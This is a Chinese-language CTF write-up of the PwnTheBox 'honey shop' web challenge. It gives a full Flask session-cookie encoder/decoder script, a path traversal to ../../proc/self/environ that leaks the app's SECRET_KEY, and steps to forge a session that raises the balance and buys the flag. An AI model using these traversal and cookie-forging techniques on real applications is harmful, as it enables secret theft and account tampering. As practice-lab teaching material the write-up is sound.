# PwnTheBox(web篇)---honey shop

# 题目

是一个蜂蜜商店的界面，有1366美金，想要购买flag需要1337美金：

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428728_62bb18b82ff17691a1c5a.png!small)

## 使用BurpSuite抓取购买Linden honey的数据包

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428729_62bb18b991884de9f522e.png!small)

> 连续发这个购买请求,发现金额没有变化, **猜测可能是传参时存在金额参数或者cookie中**

## 修改flask-session-cookie的脚本

    
    
    import sys
    import zlib
    from itsdangerous import base64_decode
    import ast
    
    
    if sys.version_info[0] < 3:  # < 3.0
        raise Exception('Must be using at least Python 3')
    elif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
        from abc import ABCMeta, abstractmethod
    else:  # > 3.4
        from abc import ABC, abstractmethod
    
    import argparse
    from flask.sessions import SecureCookieSessionInterface
    
    
    class MockApp(object):
    
        def __init__(self, secret_key):
            self.secret_key = secret_key
    
    
    if sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
        class FSCM(metaclass=ABCMeta):
            def encode(secret_key, session_cookie_structure):
                """ Encode a Flask session cookie """
                try:
                    app = MockApp(secret_key)
    
                    session_cookie_structure = dict(
                        ast.literal_eval(session_cookie_structure))
                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)
    
                    return s.dumps(session_cookie_structure)
                except Exception as e:
                    return "[Encoding error] {}".format(e)
                    raise e
    
            def decode(session_cookie_value, secret_key=None):
                """ Decode a Flask cookie  """
                try:
                    if(secret_key == None):
                        compressed = False
                        payload = session_cookie_value
    
                        if payload.startswith('.'):
                            compressed = True
                            payload = payload[1:]
    
                        data = payload.split(".")[0]
    
                        data = base64_decode(data)
                        if compressed:
                            data = zlib.decompress(data)
    
                        return data
                    else:
                        app = MockApp(secret_key)
    
                        si = SecureCookieSessionInterface()
                        s = si.get_signing_serializer(app)
    
                        return s.loads(session_cookie_value)
                except Exception as e:
                    return "[Decoding error] {}".format(e)
                    raise e
    else:  # > 3.4
        class FSCM(ABC):
            def encode(secret_key, session_cookie_structure):
                """ Encode a Flask session cookie """
                try:
                    app = MockApp(secret_key)
    
                    session_cookie_structure = dict(
                        ast.literal_eval(session_cookie_structure))
                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)
    
                    return s.dumps(session_cookie_structure)
                except Exception as e:
                    return "[Encoding error] {}".format(e)
                    raise e
    
            def decode(session_cookie_value, secret_key=None):
                """ Decode a Flask cookie  """
                try:
                    if(secret_key == None):
                        compressed = False
                        payload = session_cookie_value
    
                        if payload.startswith('.'):
                            compressed = True
                            payload = payload[1:]
    
                        data = payload.split(".")[0]
    
                        data = base64_decode(data)
                        if compressed:
                            data = zlib.decompress(data)
    
                        return data
                    else:
                        app = MockApp(secret_key)
    
                        si = SecureCookieSessionInterface()
                        s = si.get_signing_serializer(app)
    
                        return s.loads(session_cookie_value)
                except Exception as e:
                    return "[Decoding error] {}".format(e)
                    raise e
    
    
    if __name__ == "__main__":
        # Args are only relevant for __main__ usage
    
        # Description for help
        parser = argparse.ArgumentParser(
            description='Flask Session Cookie Decoder/Encoder',
            epilog="Author : Wilson Sumanang, Alexandre ZANNI")
    
        # prepare sub commands
        subparsers = parser.add_subparsers(
            help='sub-command help', dest='subcommand')
    
        # create the parser for the encode command
        parser_encode = subparsers.add_parser('encode', help='encode')
        parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                   help='Secret key', required=True)
        parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                   help='Session cookie structure', required=True)
    
        # create the parser for the decode command
        parser_decode = subparsers.add_parser('decode', help='decode')
        parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                   help='Secret key', required=False)
        parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                   help='Session cookie value', required=True)
    
        # get args
        args = parser.parse_args()
    
        # find the option chosen
        if(args.subcommand == 'encode'):
            if(args.secret_key is not None and args.cookie_structure is not None):
                print(FSCM.encode(args.secret_key, args.cookie_structure))
        elif(args.subcommand == 'decode'):
            if(args.secret_key is not None and args.cookie_value is not None):
                print(FSCM.decode(args.cookie_value, args.secret_key))
            elif(args.cookie_value is not None):
                print(FSCM.decode(args.cookie_value))
    

> 编码与解码
    
    
    python -u  "e:\code\afcc\tempp.py" encode -s "CKMmNuWug367xvgUPaee1L3B4E5Qyo0IOOqhrl2h" -t "{'balance': 1338, 'purchases': []}"    
    python -u  "e:\code\afcc\tempp.py" decode -c "eyJiYWxhbmNlIjoxMzM2LCJwdXJjaGFzZXMiOltdfQ.Yn51Kw.FFgLfdpX6kn32B-FNtyv4nqJr4U"
    

## 解码 session

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428730_62bb18bae6a10bf234deb.png!small)

> 其中balance应该为当前余额，purchases值为空

> so-> 伪造session，修改余额，所以需要SECRET_KEY的值

## 任意文件下载漏洞

> 此请求可以读取任意文件

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428732_62bb18bc127f2fff9454d.png!small)

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428734_62bb18be3495984081a7f.png!small)

## 拿到 SECRET_KEY 值

尝试访问Python环境变量：

    
    
    /proc/self    # 其路径指向当前进程
    
    /environ     # 记录当前进程的环境变量信息
    

当路径为

    
    
    ../../proc/self/environ
    

时，得到回显：

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428735_62bb18bf6dc81859ab94a.png!small)

得到了SECRET_KEY的值为 5gyyYVEb4NsYQ5dUNHmuO1v1nMHIRZMblNTz39bJ

## 构造 session

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428736_62bb18c0b86076946f183.png!small)

## 使用BurpSuite在购买flag时修改session的值发送数据包：

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428737_62bb18c1e69c211304a50.png!small)

![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)![e33637908a8e2c2f0cadfb6b6c630ad9.gif](https://image.3001.net/images/20220628/1656428739_62bb18c33d823d5dc187f.gif!small)

